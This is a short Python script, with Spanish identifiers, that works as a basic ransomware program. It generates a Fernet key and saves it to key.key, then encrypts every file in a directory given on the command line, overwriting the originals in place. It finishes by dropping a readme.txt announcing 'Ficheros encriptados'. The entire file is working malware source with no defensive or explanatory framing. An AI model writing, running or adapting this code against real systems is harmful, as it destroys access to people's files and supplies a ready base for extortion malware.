from cryptography.fernet import Fernet
import os
import argparse

def generar_key():
    key = Fernet.generate_key()
    with open('key.key', 'wb') as key_file:
        key_file.write(key)

def cargar_key():
    return open('key.key', 'rb').read()

def encrypt(items, key):
    f = Fernet(key)
    for item in items:
        with open(item, 'rb') as file:
            file_data = file.read()
        encrypted_data = f.encrypt(file_data)
        with open(item, 'wb') as file:
            file.write(encrypted_data)

def main(path_to_encrypt):
    items = os.listdir(path_to_encrypt)
    full_path = [path_to_encrypt+'\\'+item for item in items]

    generar_key()
    key = cargar_key()

    encrypt(full_path, key)

    with open(path_to_encrypt+'\\'+'readme.txt', 'w') as file:
        file.write('Ficheros encriptados \n')
        #file.write('Para desifrarlos ejecute decrypt.py')

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description=' ',formatter_class=argparse.
                                RawDescriptionHelpFormatter)

    parser.add_argument("-enc", metavar='ENCRIPTAR', dest="enc", required=True)

    path_to_encrypt = parser.parse_args().enc

    main(path_to_encrypt)


